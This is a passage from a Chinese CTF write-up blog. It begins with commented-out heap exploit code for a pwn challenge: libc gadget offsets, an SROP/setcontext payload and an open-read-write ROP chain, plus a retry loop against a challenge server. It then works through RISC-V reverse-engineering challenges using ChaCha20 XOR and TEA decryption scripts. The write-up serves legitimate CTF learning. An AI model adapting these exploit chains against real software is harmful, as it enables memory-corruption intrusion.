libc.sym["__free_hook"]</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment">#binsh = libc_base + libc.search("/bin/sh").next()</span></span><br><span class="line"><span class="comment">#setcontext = libc_base + libc.sym["setcontext"]</span></span><br><span class="line"><span class="comment">#pop_rax_ret = libc_base + 0x000000000004a550 </span></span><br><span class="line"><span class="comment">#pop_rsi_ret = libc_base + 0x0000000000027529 </span></span><br><span class="line"><span class="comment">#pop_rdx_r12_ret = libc_base + 0x000000000011c1e1</span></span><br><span class="line"><span class="comment">#pop_rdi_ret = libc_base + 0x0000000000026b72 </span></span><br><span class="line"><span class="comment">#syscall_ret = libc_base + 0x0000000000066229</span></span><br><span class="line"><span class="comment">#magic_gadget = libc_base + 0x00000000001547a0</span></span><br><span class="line"><span class="comment">#0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; #call qword ptr [rdx + 0x20]; </span></span><br><span class="line"><span class="comment">#ret = libc_base + 0x00000000000c1479</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#heap_addr = u64(rc(6).ljust(8,'\x00'))-0x470</span></span><br><span class="line"><span class="comment">#print "heap_addr---&gt;" + hex(heap_addr)</span></span><br><span class="line"><span class="comment">#pay_start = heap_addr+0xec0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#def srop_pay():</span></span><br><span class="line">    <span class="comment">#pay = ''</span></span><br><span class="line">    <span class="comment">#pay += p64(0) + p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x20,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(setcontext+33)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x68,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x110)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0xa0,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0xe0,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#return pay</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#def orw_pay():</span></span><br><span class="line">    <span class="comment">#pay = ''</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start+0x100)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x2)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(3)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(heap_addr)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdx_r12_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x40)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x0)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(1)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(heap_addr)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdx_r12_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x40)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x1)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x100,'a')</span></span><br><span class="line">    <span class="comment">#pay += './flag\x00\x00'</span></span><br><span class="line">    <span class="comment">#return pay</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     print i</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         pwn()</span></span><br><span class="line"><span class="comment">#     except EOFError:</span></span><br><span class="line"><span class="comment">#         p.close()</span></span><br><span class="line"><span class="comment">#         local = 1</span></span><br><span class="line"><span class="comment">#         elf = ELF('./note_five')</span></span><br><span class="line"><span class="comment">#         if local:</span></span><br><span class="line"><span class="comment">#             p = process('./note_five')</span></span><br><span class="line"><span class="comment">#             libc = elf.libc</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             p = remote('121.40.246.48',9999)</span></span><br><span class="line"><span class="comment">#             libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         sl("ls")</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/image-20210203234956215.png" alt="image-20210203234956215"></p>
<p>这里猜测一下栈的位置也是不变的，盲猜爆破栈地址，实现跳栈上的shellcode，就像之前做那个arm的题目一样，以后有机会再试试看，因为栈是可以执行的。</p>
<h3 id="二、RE"><a href="#二、RE" class="headerlink" title="二、RE"></a>二、RE</h3><h4 id="1、flag0"><a href="#1、flag0" class="headerlink" title="1、flag0"></a>1、flag0</h4><h5 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h5><p>这题是riscv64架构的题目，首先下载安装ghidra9.2，网盘地址是：</p>
<p><a href="https://pan.baidu.com/s/1C9JYsPq0xvF5pGW8yefeaw" target="_blank" rel="noopener">https://pan.baidu.com/s/1C9JYsPq0xvF5pGW8yefeaw</a> </p>
<p>pass：e57x </p>
<p>因为9.2静态分析加入了对于riscv架构的反编译，也可以装个choco包管理器，然后在管理员状态下的命令行输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install ghidra</span><br></pre></td></tr></table></figure>

<p>同时为了进行动态调试，我们还需要搭建调试的环境，这里经过踩坑发现，只有ubuntu20下利用gdb9.2，装上最新版的gef插件，才能进行动态调试，这里给个gef的地址：</p>
<p><a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></p>
<p>配置时只需要把pwndbg切换下即可，因为pwndbg和peda对于调试有点问题，不支持，所以用gef。</p>
<h5 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h5><p>先结合输出的字符串用ghidra定位到main函数的位置</p>
<p><img src="/blog_img/image-20210120105746608.png" alt="image-20210120105746608"></p>
<p><img src="/blog_img/image-20210120110147313.png" alt="image-20210120110147313"></p>
<p>找到了main函数的位置，但是因为反编译会报错，所以我们直接看汇编即可，这里先学习一下riscv64的汇编看看(略)，最简单最快的方法就是自己写测试demo，然后生成.s文件去看汇编即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello %s!\n"</span>,<span class="string">"World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x0000000000010198</span> &lt;+<span class="number">0</span>&gt;:     addi    sp,sp,<span class="number">-16</span></span><br><span class="line">   <span class="number">0x000000000001019a</span> &lt;+<span class="number">2</span>&gt;:     sd      ra,<span class="number">8</span>(sp) <span class="meta">#push</span></span><br><span class="line">   <span class="number">0x000000000001019c</span> &lt;+<span class="number">4</span>&gt;:     sd      s0,<span class="number">0</span>(sp)</span><br><span class="line">   <span class="number">0x000000000001019e</span> &lt;+<span class="number">6</span>&gt;:     addi    s0,sp,<span class="number">16</span></span><br><span class="line">   <span class="number">0x00000000000101a0</span> &lt;+<span class="number">8</span>&gt;:     lui     a5,<span class="number">0x1a</span></span><br><span class="line">   <span class="number">0x00000000000101a2</span> &lt;+<span class="number">10</span>&gt;:    addi    a1,a5,<span class="number">-1504</span> # <span class="number">0x19a20</span>   #加载字符串<span class="string">"Hello %s!\n"</span> 的地址</span><br><span class="line">   <span class="number">0x00000000000101a6</span> &lt;+<span class="number">14</span>&gt;:    lui     a5,<span class="number">0x1a</span></span><br><span class="line">   <span class="number">0x00000000000101a8</span> &lt;+<span class="number">16</span>&gt;:    addi    a0,a5,<span class="number">-1496</span> # <span class="number">0x19a28</span>   #加载字符串<span class="string">"Wrold"</span>的地址</span><br><span class="line">   <span class="number">0x00000000000101ac</span> &lt;+<span class="number">20</span>&gt;:    jal     ra,<span class="number">0x1035a</span> &lt;<span class="built_in">printf</span>&gt;     #调用<span class="built_in">printf</span>, <span class="built_in">printf</span>会从a0,a1内获取参数</span><br><span class="line">   <span class="number">0x00000000000101b0</span> &lt;+<span class="number">24</span>&gt;:    nop</span><br><span class="line">   <span class="number">0x00000000000101b2</span> &lt;+<span class="number">26</span>&gt;:    ld      ra,<span class="number">8</span>(sp) <span class="meta">#pop</span></span><br><span class="line">   <span class="number">0x00000000000101b4</span> &lt;+<span class="number">28</span>&gt;:    ld      s0,<span class="number">0</span>(sp)</span><br><span class="line">   <span class="number">0x00000000000101b6</span> &lt;+<span class="number">30</span>&gt;:    addi    sp,sp,<span class="number">16</span></span><br><span class="line">   <span class="number">0x00000000000101b8</span> &lt;+<span class="number">32</span>&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>知道了a0和a1等是用来传参数的，返回值放到a0，然后继续分析：</p>
<p><img src="/blog_img/image-20210120114710259.png" alt="image-20210120114710259"></p>
<p>这里通过动态调试发现，输入的字符长度是a3(strlen计算后的值)，然后要check的字符串长度经过调试发现是0x59个字符，所以第一步输入长度确定了是89个字符，继续分析汇编以及动态调试：</p>
<p><img src="/blog_img/image-20210120121623051.png" alt="image-20210120121623051"></p>
<p>malloc_store将flag后面的48位用堆块保存了起来(动态调试得到)，同时分析store函数可知</p>
<p>store函数通过扩展将table1和table2的值以及我们的flag一起填充到栈上保存：</p>
<p><img src="/blog_img/image-20210120121525140.png" alt="image-20210120121525140"></p>
<p>接着进行chacha20加密，其实说白了也就是和rc4一样，先初始化数据，再进行异或加密而已</p>
<p><img src="/blog_img/image-20210120135908828.png" alt="image-20210120135908828"></p>
<p>这里提取出xor后stack上面进行异或的key(一共0x29个字符)：</p>
<p><img src="/blog_img/image-20210120140033541.png" alt="image-20210120140033541"></p>
<p>然后进行密文的check1，这里只check前0x29个字节</p>
<p><img src="/blog_img/image-20210120143056823.png" alt="image-20210120143056823"></p>
<p>调用check1时动态调试获取到check的密文，一共0x29位：</p>
<p><img src="/blog_img/image-20210120143203779.png" alt="image-20210120143203779"></p>
<p>这样第一部分的flag就可以解出来了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">'88 e7 03 b4 36 cd 97 ab 5a a5 a6 0b df ce 08 3b 9d 90 32 3c 4e 15 14 bd 8d 38 38 b0 ee 2a bc 4b f9 aa 24 26 76 a3 a5 75 5e'</span>.split(<span class="string">' '</span>)</span><br><span class="line">key = <span class="string">'ee 8b 62 d3 4d a5 f6 dd 3f fa df 64 aa 91 7c 49 f4 f5 56 63 29 7d 7d d9 ff 59 01 9e dc 75 d8 2e 9a c5 49 56 1f cf c0 07 01'</span>.split(<span class="string">' '</span>)</span><br><span class="line">key = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">c = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">	flag1 += chr(c[i]^key[i])</span><br><span class="line"><span class="keyword">print</span> flag1</span><br><span class="line"><span class="comment">#flag&#123;have_you_tried_ghidra9.2_decompiler_</span></span><br></pre></td></tr></table></figure>

<p>下面继续运行看下第二层加密，针对后面48个字符，我们将断点下到tea那里，然后看下a0和a1的参数：</p>
<p><img src="/blog_img/image-20210120144452551.png" alt="image-20210120144452551"></p>
<p>可以知道a0是我们的后48个字符，a1是我们tea算法的key：</p>
<p><img src="/blog_img/image-20210120144549321.png" alt="image-20210120144549321"></p>
<p>分析下tea算法：</p>
<p><img src="/blog_img/image-20210120144650630.png" alt="image-20210120144650630"></p>
<p>这里可以很清楚看到，除了while循环的轮转数从32变为16外，其他的不变，这里key和输入的明文都以int形式存储(动态调试可以知道)，也就是4字节为单位，小端序，48个字符，就有12个4字节的数据，每次运算2个，所以只需要写个python脚本即可实现求解，现在继续寻找我们的check2密文，同样下断点然后看check的参数</p>
<p><img src="/blog_img/image-20210120145350056.png" alt="image-20210120145350056"></p>
<p><img src="/blog_img/image-20210120145252739.png" alt="image-20210120145252739"></p>
<p>4字节为单位，就是：</p>
<p><img src="/blog_img/image-20210120145317798.png" alt="image-20210120145317798"></p>
<p>提取密文，我们再次写脚本求解即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="number">0x1368a0bb</span>, <span class="number">0x190ace1e</span> , <span class="number">0x35d8a357</span> ,<span class="number">0x26bf2c61</span>]</span><br><span class="line">v = [<span class="number">0xc45087f9</span> , <span class="number">0x0703f2b2</span> , <span class="number">0x6974f43c</span>, <span class="number">0xedb4bb59</span> ,</span><br><span class="line"><span class="number">0x0ff0b02a</span> , <span class="number">0x008520f2</span> ,<span class="number">0xfdcd23dd</span>  , <span class="number">0x35024875</span> ,                                                                                                                                                                                                     </span><br><span class="line"><span class="number">0xf1d7b6d3</span> , <span class="number">0x74f21be1</span> , <span class="number">0xcb2dbf12</span>  , <span class="number">0xa4b453f6</span> ]</span><br><span class="line">flag2 = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v0,v1,k)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag2</span><br><span class="line">    sume=<span class="number">0xe3779b90</span><span class="comment">#(0x9e3779b9*16)&amp;0xffffffff=0xe3779b90</span></span><br><span class="line">    delta=<span class="number">0x9e3779b9</span>                      </span><br><span class="line">    k0=k[<span class="number">0</span>]</span><br><span class="line">    k1=k[<span class="number">1</span>]</span><br><span class="line">    k2=k[<span class="number">2</span>]</span><br><span class="line">    k3=k[<span class="number">3</span>] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):                       </span><br><span class="line">        v1 = (v1-(((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sume) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3)))&amp;<span class="number">0xffffffff</span> </span><br><span class="line">        v0 = (v0-(((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sume) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1)))&amp;<span class="number">0xffffffff</span></span><br><span class="line">        sume = (sume - delta)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment">#存的时候小端序，现在要倒过来</span></span><br><span class="line">    flag2 += (hex(v0).strip(<span class="string">'0x'</span>).decode(<span class="string">'hex'</span>))[::<span class="number">-1</span>]</span><br><span class="line">    flag2 += (hex(v1).strip(<span class="string">'0x'</span>).decode(<span class="string">'hex'</span>))[::<span class="number">-1</span>]</span><br><span class="line">                                </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">12</span>:</span><br><span class="line">    decrypt(v[i],v[i+<span class="number">1</span>],k)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">print(<span class="string">"flag2---&gt;"</span>+flag2)</span><br><span class="line"><span class="comment">#if_you_have_hexriscv_plz_share_it_with_me_thx:P&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在将2部分的脚本合并在一起即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">'88 e7 03 b4 36 cd 97 ab 5a a5 a6 0b df ce 08 3b 9d 90 32 3c 4e 15 14 bd 8d 38 38 b0 ee 2a bc 4b f9 aa 24 26 76 a3 a5 75 5e'</span>.split(<span class="string">' '</span>)</span><br><span class="line">key = <span class="string">'ee 8b 62 d3 4d a5 f6 dd 3f fa df 64 aa 91 7c 49 f4 f5 56 63 29 7d 7d d9 ff 59 01 9e dc 75 d8 2e 9a c5 49 56 1f cf c0 07 01'</span>.split(<span class="string">' '</span>)</span><br><span class="line">key = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">c = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">	flag1 += chr(c[i]^key[i])</span><br><span class="line"><span class="keyword">print</span> flag1</span><br><span class="line"><span class="comment">#flag&#123;have_you_tried_ghidra9.2_decompiler_</span></span><br><span class="line">k = [<span class="number">0x1368a0bb</span>, <span class="number">0x190ace1e</span> , <span class="number">0x35d8a357</span> ,<span class="number">0x26bf2c61</span>]</span><br><span class="line">v = [<span class="number">0xc45087f9</span> , <span class="number">0x0703f2b2</span> , <span class="number">0x6974f43c</span>, <span class="number">0xedb4bb59</span> ,</span><br><span class="line"><span class="number">0x0ff0b02a</span> , <span class="number">0x008520f2</span> ,<span class="number">0xfdcd23dd</span>  , <span class="number">0x35024875</span> ,                                                                                                                                                                                                     </span><br><span class="line"><span class="number">0xf1d7b6d3</span> , <span class="number">0x74f21be1</span> , <span class="number">0xcb2dbf12</span>  , <span class="number">0xa4b453f6</span> ]</span><br><span class="line">flag2 = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v0,v1,k)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag2</span><br><span class="line">    sume=<span class="number">0xe3779b90</span><span class="comment">#(0x9e3779b9*16)&amp;0xffffffff=0xe3779b90</span></span><br><span class="line">    delta=<span class="number">0x9e3779b9</span>                      </span><br><span class="line">    k0=k[<span class="number">0</span>]</span><br><span class="line">    k1=k[<span class="number">1</span>]</span><br><span class="line">    k2=k[<span class="number">2</span>]</span><br><span class="line">    k3=k[<span class="number">3</span>] </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):                       </span><br><span class="line">        v1 = (v1-(((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sume) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3)))&amp;<span class="number">0xffffffff</span> </span><br><span class="line">        v0 = (v0-(((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sume) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1)))&amp;<span class="number">0xffffffff</span></span><br><span class="line">        sume = (sume - delta)&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    flag2 += (hex(v0).strip(<span class="string">'0x'</span>).decode(<span class="string">'hex'</span>))[::<span class="number">-1</span>]</span><br><span class="line">    flag2 += (hex(v1).strip(<span class="string">'0x'</span>).decode(<span class="string">'hex'</span>))[::<span class="number">-1</span>]</span><br><span class="line">                                </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">12</span>:</span><br><span class="line">    decrypt(v[i],v[i+<span class="number">1</span>],k)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag2</span><br><span class="line"><span class="comment">#if_you_have_hexriscv_plz_share_it_with_me_thx:P&#125;</span></span><br><span class="line"><span class="keyword">print</span> flag1+flag2</span><br><span class="line"><span class="comment">#flag&#123;have_you_tried_ghidra9.2_decompiler_if_you_have_hexriscv_plz_share_it_with_me_thx:P&#125;</span></span><br></pre></td></tr></table></figure>

<p>最后检验下结果：</p>
<p><img src="/blog_img/image-20210120145925540.png" alt="image-20210120145925540"></p>
<h4 id="2、chinesegame"><a href="#2、chinesegame" class="headerlink" title="2、chinesegame"></a>2、chinesegame</h4><p>这题给了本地的附件，也就是本地输入正确，远程会回显flag回来，盲猜会执行cat flag命令，于是查找一波字符串：</p>
<p><img src="/blog_img/image-20210120152100529.png" alt="image-20210120152100529"></p>
<p>确实有，交叉引用既可定位到main函数了，然后经过静态分析和动态调试，知道了函数的功能，更改函数名如下，方便自己理解：</p>
<p><img src="/blog_img/image-20210120152136037.png" alt="image-20210120152136037"></p>
<p>逻辑很简单，首先初始化heap，动态调试会发现，init_heap完成后，会生成堆块链表，bk指针作为链接，fd指针存储值，然后输入我们的操作，这里只能输入0和1的字符，输入完，0和1分别有自己的handle函数，等输入全部处理完后退出，或者856次操作后才从for循环退出来(就算输入900个字符，第856次也会退出)，我们再看下check函数：</p>
<p><img src="/blog_img/image-20210120152607948.png" alt="image-20210120152607948"></p>
<p>check是检查是不是堆块中的所有值都是小于0x64(100)，是的话就cat flag结束程序，现在重点就是分析那个0和1的操作在干什么？</p>
<p>看下0：</p>
<p><img src="/blog_img/image-20210120220640972.png" alt="image-20210120220640972"></p>
<p>再看下1：</p>
<p><img src="/blog_img/image-20210120220659508.png" alt="image-20210120220659508"></p>
<p>在for循环中我们可以知道，堆中数据的下标和table的下标满足这样的等式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">j = table[i]<span class="comment">//获取到的值</span></span><br><span class="line">heap[<span class="number">10</span>-j]<span class="comment">//修改的堆块</span></span><br></pre></td></tr></table></figure>

<p>根绝这个规则我们可以知道table前面2行的值对应修改的堆块下标关系：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//table值</span></span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span></span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="comment">//堆的下标</span></span><br><span class="line"><span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span></span><br><span class="line"><span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>通过分析可以知道handle1和handle2的功能：</p>
<p>我们把大于100的数字看成1，小于100的看成0，那么2个handle函数能实现以下的转化关系</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">110000</span>---&gt;<span class="number">010000</span>  <span class="comment">//1-&gt;0  handle1功能，也就是输入0</span></span><br><span class="line"><span class="number">010000</span>---&gt;<span class="number">110000</span>  <span class="comment">//0-&gt;1  handle2功能，也就是输入1</span></span><br></pre></td></tr></table></figure>

<p>如果第一个值是我们想要变换的值，需要满足它的下一位为1，再往后的其他全部位为0，才能把当前值从1变为0，也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">110000</span>---&gt;<span class="number">010000</span>  <span class="comment">//1-&gt;0  handle1功能，也就是输入0</span></span><br></pre></td></tr></table></figure>

<p>如果第一个值是我们想要变换的值且为0，需要满足它的下一位为1，再往后的其他全部位为0，才能把当前值从0变为1，也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">010000</span>---&gt;<span class="number">110000</span>  <span class="comment">//0-&gt;1  handle2功能，也就是输入1</span></span><br></pre></td></tr></table></figure>

<p>且最后一位可以随意变换，当最后一位为1时输入0可以变为0，当最后一位为0时输入1可以变为1，也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000000</span>---&gt;<span class="number">000001</span>  <span class="comment">//0-&gt;1  handle2功能，也就是输入1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000001</span>---&gt;<span class="number">000000</span>  <span class="comment">//1-&gt;0  handle1功能，也就是输入0</span></span><br></pre></td></tr></table></figure>

<p>其实一开始我也自己研究了下，怎么利用上面的规则实现把所有的值变为小于0，但是搞了一波发现，好像有点难，但是也发现了好像有一些套路的，然后那个table里面的值对应改变堆块的值，要是遇到堆块的值为1，我们输入0，看能不能把堆块值变为0，如果遇到堆块值为0，输入1，看能不能把堆块值变为1，说干就干，以下是手动的测试例子：</p>
